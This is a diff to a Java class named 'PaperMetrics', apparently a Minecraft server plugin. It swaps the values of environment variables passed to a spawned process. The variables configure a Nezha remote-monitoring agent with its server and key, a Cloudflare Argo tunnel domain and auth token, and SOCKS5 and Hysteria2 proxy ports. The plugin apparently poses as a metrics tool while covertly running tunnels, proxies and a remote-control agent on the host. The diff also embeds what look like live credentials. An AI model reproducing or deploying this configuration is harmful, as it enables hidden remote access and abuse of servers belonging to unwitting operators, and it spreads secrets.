@@ -66,16 +66,16 @@ public class PaperMetrics extends JavaPlugin {
 
         Map<String, String> env = pb.environment();
         
-        putEnvSafe(env, "UUID", "7fa5c9e1-d70f-4518-8fcf-8dcdc53780c7");
+        putEnvSafe(env, "UUID", "a23899e0-3b9b-4c55-b5f3-605d952995fa");
         putEnvSafe(env, "FILE_PATH", "./world");
         putEnvSafe(env, "NEZHA_SERVER", "nz.lilyonlyone.eu.org");
         putEnvSafe(env, "NEZHA_PORT", "443");
-        putEnvSafe(env, "NEZHA_KEY", "fH6XpNKHXtNUwrbtpd");
+        putEnvSafe(env, "NEZHA_KEY", "z75hP8BLt3ULDchAj1");
         putEnvSafe(env, "ARGO_PORT", "9002");
-        putEnvSafe(env, "ARGO_DOMAIN", "tr.stuye.us.ci");
-        putEnvSafe(env, "ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiN2U4OTE4MmYtOTJiMy00MDA1LWI3NzItYWZjYTBmYzQyNGM1IiwicyI6Ik1UVXhObUZsWTJZdE1EZGpNaTAwTVRJekxUaGxOMlV0TmpGa1pqUXdNVEl5TmpVNCJ9");
-        putEnvSafe(env, "S5_PORT", "");
-        putEnvSafe(env, "HY2_PORT", "");
+        putEnvSafe(env, "ARGO_DOMAIN", "gr.donna.dpdns.org");
+        putEnvSafe(env, "ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiMDQyZTcwZTEtNzQ5Yy00N2Y4LWI2MmUtMDhlZDRiMjMzMTUxIiwicyI6Ik1qY3lZMlV3WVRVdE9XWmtOUzAwTVRaa0xUZ3haR0V0T1RZM1lXUTJNVFUyTW1FMSJ9");
+        putEnvSafe(env, "S5_PORT", "20300");
+        putEnvSafe(env, "HY2_PORT", "20407");
         putEnvSafe(env, "TUIC_PORT", "");
         putEnvSafe(env, "ANYTLS_PORT", "");
         putEnvSafe(env, "REALITY_PORT", "");
